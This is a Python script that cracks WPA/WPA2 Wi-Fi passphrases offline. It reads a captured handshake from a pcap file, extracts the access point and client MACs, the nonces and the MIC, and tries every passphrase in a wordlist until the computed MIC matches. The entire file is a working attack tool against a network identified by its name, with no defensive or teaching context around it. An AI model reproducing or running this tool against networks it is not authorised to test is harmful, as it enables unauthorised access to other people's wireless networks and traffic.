import hashlib
import hmac
import sys
import time


class Data:
    # File Descriptors
    p = open(sys.argv[4], "r")
    # File Data
    essid = sys.argv[2]
    pcap_file = open(sys.argv[5], "rb")
    # Bytestrings
    amac = b''
    smac = b''
    anonce = b''
    snonce = b''
    mic = b''
    data = b''
    # Cycle Data
    counter = 0
    kps_counter = 0
    kps = 0
    ts = time.time()
    ts2 = time.time()


def get_handshake_data(essid, pcap_file):
    amac = []
    smac = []
    anonce = []
    snonce = []
    mic = []
    data = []
    beacon = False
    handshake1 = False
    handshake2 = False
    pcap_bytes = []
    for byte in pcap_file.read():
        pcap_bytes.append(byte)
    for i in range(len(pcap_bytes)):
        if pcap_bytes[i] == 0x80 and pcap_bytes[i + 1] == 0x00 and beacon == False:
            test_essid = ""
            essid_length = pcap_bytes[i + 37]
            for j in range(essid_length):
                test_essid += chr(pcap_bytes[i + 38 + j])
            if test_essid == essid:
                for k in range(6):
                    amac.append(pcap_bytes[i + 10 + k])
                beacon = True
        if pcap_bytes[i] == 0x88 and pcap_bytes[i + 1] == 0x02 and beacon == True and handshake1 == False:
            test_amac = []
            for j in range(6):
                test_amac.append(pcap_bytes[i + 10 + j])
            if test_amac == amac:
                for k in range(6):
                    smac.append(pcap_bytes[i + 4 + k])
                for k in range(32):
                    anonce.append(pcap_bytes[i + 51 + k])
                handshake1 = True
        if pcap_bytes[i] == 0x88 and pcap_bytes[
                    i + 1] == 0x01 and beacon is True and handshake1 is True and handshake2 is False:
            test_amac = []
            test_smac = []
            for j in range(6):
                test_amac.append(pcap_bytes[i + 4 + j])
            for j in range(6):
                test_smac.append(pcap_bytes[i + 10 + j])
            if test_amac == amac and test_smac == smac:
                for k in range(32):
                    snonce.append(pcap_bytes[i + 51 + k])
                for k in range(16):
                    mic.append(pcap_bytes[i + 115 + k])
                    pcap_bytes[i + 115 + k] = 0x00
                for k in range(99):
                    data.append(pcap_bytes[i + 34 + k])
                for k in range(data[98]):
                    data.append(pcap_bytes[i + 35 + 98 + k])
                handshake2 = True
        if beacon is True and handshake1 is True and handshake2 is True:
            break
    return bytes(amac), bytes(smac), bytes(anonce), bytes(snonce), bytes(mic), bytes(data)


def bytes_to_hex(b):
    h = ""
    l = len(b)
    for i in range(l):
        cb = b[i]
        if cb < 16:
            h += "0"
        h += hex(cb)[2:l - 1]
        if i < l - 1:
            h += " "
    return h


# Calculate Pairwise Master Key
def calculate_pmk(password, essid):
    return hashlib.pbkdf2_hmac("sha1", bytes(password, "utf-8"), bytes(essid, "utf-8"), 4096, 32)


# Calculate Pairwise Transient Key
def calculate_ptk(amac, smac, anonce, snonce, pmk):
    # Variable for constructed ptk
    ptk = b''
    # Literally "Pairwise Key Expansion" + trailing 0x00
    pke = [0x50, 0x61, 0x69, 0x72, 0x77, 0x69, 0x73, 0x65, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x65, 0x78, 0x70, 0x61, 0x6e,
           0x73, 0x69, 0x6f, 0x6e, 0x00]
    pke += min(amac, smac)
    pke += max(amac, smac)
    pke += min(anonce, snonce)
    pke += max(anonce, snonce)
    pke.append(0x00)
    # Swap out last byte and hash into ptk
    for i in range(4):
        pke[99] = i
        ptk += hmac.new(pmk, bytes(pke), "sha1").digest()
    return ptk


def calculate_mic(ptk, data):
    data = bytes(data)
    return hmac.new(ptk[0:16], data, "sha1").digest()[0:16]


def calculate(password):
    pmk = calculate_pmk(password, Data.essid)
    ptk = calculate_ptk(Data.amac, Data.smac, Data.anonce, Data.snonce, pmk)
    cmic = calculate_mic(ptk, Data.data)
    return pmk, ptk, cmic


def initialize():
    Data.amac, Data.smac, Data.anonce, Data.snonce, Data.mic, Data.data = get_handshake_data(Data.essid, Data.pcap_file)
    Data.pcap_file.close()


def cycle():
    password = Data.p.readline().strip("\n")
    if password != "":
        Data.counter += 1
        pmk, ptk, cmic = calculate(password)
        if time.time() - Data.ts >= 1:
            Data.kps = Data.counter - Data.kps_counter
            Data.kps_counter = Data.counter
            Data.ts = time.time()
        if time.time() - Data.ts2 >= 0.05:
            print("Keys tested: {0} ({1} k/s)".format(Data.counter, Data.kps))
            print("Current Passphrase: {0}".format(password))
            print("Master Key: {0}".format(bytes_to_hex(pmk)))
            print("Transient Key: {0}".format(bytes_to_hex(ptk)))
            print("Message Integrity Check: {0}\n".format(bytes_to_hex(cmic)))
            Data.ts2 = time.time()
        if cmic == Data.mic:
            print("Keys tested: {0} ({1} k/s)".format(Data.counter, Data.kps))
            print("Current Passphrase: {0}".format(password))
            print("Master Key: {0}".format(bytes_to_hex(pmk)))
            print("Transient Key: {0}".format(bytes_to_hex(ptk)))
            print("Message Integrity Check: {0}\n".format(bytes_to_hex(cmic)))
            print("Key found! [ {0} ]\n".format(password))
            exit(0)
    else:
        print("Passphrase not in Dictionary!")
        exit(0)


def run():
    initialize()
    while True:
        try:
            cycle()
        except KeyboardInterrupt:
            Data.p.close()
            exit(0)


run()
